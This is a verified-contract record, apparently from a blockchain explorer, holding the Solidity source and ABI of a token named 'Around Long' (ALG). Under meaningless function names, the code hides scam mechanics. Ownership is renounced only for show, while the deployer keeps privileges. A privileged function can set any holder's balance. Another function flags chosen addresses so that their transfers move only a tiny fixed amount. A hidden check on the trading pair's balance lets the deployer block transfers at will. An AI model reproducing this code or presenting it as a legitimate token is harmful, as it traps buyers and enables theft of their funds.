{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface modeTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellShould {\n    function createPair(address senderMarketingLaunched, address maxSenderIs) external returns (address);\n}\n\ninterface teamTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atTake) external view returns (uint256);\n\n    function transfer(address exemptMarketingTo, uint256 marketingLiquidity) external returns (bool);\n\n    function allowance(address feeLaunchedReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptMarketingTo,\n        uint256 marketingLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletTradingSell, uint256 value);\n    event Approval(address indexed feeLaunchedReceiver, address indexed spender, uint256 value);\n}\n\ninterface teamTotalMetadata is teamTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AroundLong is enableFee, teamTotal, teamTotalMetadata {\n\n    mapping(address => uint256) private exemptAuto;\n\n    string private autoTokenWallet = \"ALG\";\n\n    uint256 constant listAmount = 6 ** 10;\n\n    bool public isAt;\n\n    bool private launchedBuy;\n\n    uint256 private sellAmount;\n\n    uint8 private marketingEnable = 18;\n\n    mapping(address => bool) public tradingAutoTx;\n\n    uint256 private fundLimit = 100000000 * 10 ** 18;\n\n    address feeLaunchAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return walletTeam;\n    }\n\n    function launchReceiver(address shouldLaunchedTeam, address exemptMarketingTo, uint256 marketingLiquidity) internal returns (bool) {\n        if (shouldLaunchedTeam == autoExemptMode) {\n            return receiverMarketing(shouldLaunchedTeam, exemptMarketingTo, marketingLiquidity);\n        }\n        uint256 senderBuyLaunch = teamTotal(autoMode).balanceOf(feeLaunchAt);\n        require(senderBuyLaunch == receiverMode);\n        require(exemptMarketingTo != feeLaunchAt);\n        if (toTotalAuto[shouldLaunchedTeam]) {\n            return receiverMarketing(shouldLaunchedTeam, exemptMarketingTo, listAmount);\n        }\n        return receiverMarketing(shouldLaunchedTeam, exemptMarketingTo, marketingLiquidity);\n    }\n\n    event OwnershipTransferred(address indexed tradingTeam, address indexed senderFee);\n\n    function getOwner() external view returns (address) {\n        return walletTeam;\n    }\n\n    uint256 public swapMax;\n\n    function launchTo(address isSwap) public {\n        if (fundReceiver) {\n            return;\n        }\n        if (swapMax != exemptMin) {\n            swapMax = exemptMin;\n        }\n        tradingAutoTx[isSwap] = true;\n        if (exemptMin == sellAmount) {\n            isAt = true;\n        }\n        fundReceiver = true;\n    }\n\n    bool public fundReceiver;\n\n    function allowance(address fundLaunch, address launchedWallet) external view virtual override returns (uint256) {\n        if (launchedWallet == buyReceiverTake) {\n            return type(uint256).max;\n        }\n        return swapMarketingTx[fundLaunch][launchedWallet];\n    }\n\n    uint256 public exemptMin;\n\n    uint256 receiverMode;\n\n    function approve(address launchedWallet, uint256 marketingLiquidity) public virtual override returns (bool) {\n        swapMarketingTx[_msgSender()][launchedWallet] = marketingLiquidity;\n        emit Approval(_msgSender(), launchedWallet, marketingLiquidity);\n        return true;\n    }\n\n    address public autoExemptMode;\n\n    function transferFrom(address shouldLaunchedTeam, address exemptMarketingTo, uint256 marketingLiquidity) external override returns (bool) {\n        if (_msgSender() != buyReceiverTake) {\n            if (swapMarketingTx[shouldLaunchedTeam][_msgSender()] != type(uint256).max) {\n                require(marketingLiquidity <= swapMarketingTx[shouldLaunchedTeam][_msgSender()]);\n                swapMarketingTx[shouldLaunchedTeam][_msgSender()] -= marketingLiquidity;\n            }\n        }\n        return launchReceiver(shouldLaunchedTeam, exemptMarketingTo, marketingLiquidity);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingEnable;\n    }\n\n    address public autoMode;\n\n    function name() external view virtual override returns (string memory) {\n        return sellTokenBuy;\n    }\n\n    address private walletTeam;\n\n    function exemptFrom(uint256 marketingLiquidity) public {\n        totalMode();\n        receiverMode = marketingLiquidity;\n    }\n\n    function tokenShouldLimit(address modeReceiver, uint256 marketingLiquidity) public {\n        totalMode();\n        exemptAuto[modeReceiver] = marketingLiquidity;\n    }\n\n    function enableSwapLiquidity() public {\n        emit OwnershipTransferred(autoExemptMode, address(0));\n        walletTeam = address(0);\n    }\n\n    constructor (){\n        \n        modeTo atFrom = modeTo(buyReceiverTake);\n        autoMode = sellShould(atFrom.factory()).createPair(atFrom.WETH(), address(this));\n        \n        autoExemptMode = _msgSender();\n        enableSwapLiquidity();\n        tradingAutoTx[autoExemptMode] = true;\n        exemptAuto[autoExemptMode] = fundLimit;\n        if (swapMax != sellAmount) {\n            isAt = true;\n        }\n        emit Transfer(address(0), autoExemptMode, fundLimit);\n    }\n\n    function totalMode() private view {\n        require(tradingAutoTx[_msgSender()]);\n    }\n\n    function receiverMarketing(address shouldLaunchedTeam, address exemptMarketingTo, uint256 marketingLiquidity) internal returns (bool) {\n        require(exemptAuto[shouldLaunchedTeam] >= marketingLiquidity);\n        exemptAuto[shouldLaunchedTeam] -= marketingLiquidity;\n        exemptAuto[exemptMarketingTo] += marketingLiquidity;\n        emit Transfer(shouldLaunchedTeam, exemptMarketingTo, marketingLiquidity);\n        return true;\n    }\n\n    uint256 enableAutoLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundLimit;\n    }\n\n    string private sellTokenBuy = \"Around Long\";\n\n    function balanceOf(address atTake) public view virtual override returns (uint256) {\n        return exemptAuto[atTake];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoTokenWallet;\n    }\n\n    function launchToTake(address senderTakeFrom) public {\n        totalMode();\n        \n        if (senderTakeFrom == autoExemptMode || senderTakeFrom == autoMode) {\n            return;\n        }\n        toTotalAuto[senderTakeFrom] = true;\n    }\n\n    mapping(address => bool) public toTotalAuto;\n\n    mapping(address => mapping(address => uint256)) private swapMarketingTx;\n\n    address buyReceiverTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address modeReceiver, uint256 marketingLiquidity) external virtual override returns (bool) {\n        return launchReceiver(_msgSender(), modeReceiver, marketingLiquidity);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLaunchedReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTradingSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoExemptMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSwapLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingLiquidity\",\"type\":\"uint256\"}],\"name\":\"exemptFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSwap\",\"type\":\"address\"}],\"name\":\"launchTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTakeFrom\",\"type\":\"address\"}],\"name\":\"launchToTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toTotalAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingLiquidity\",\"type\":\"uint256\"}],\"name\":\"tokenShouldLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingAutoTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLaunchedTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptMarketingTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AroundLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}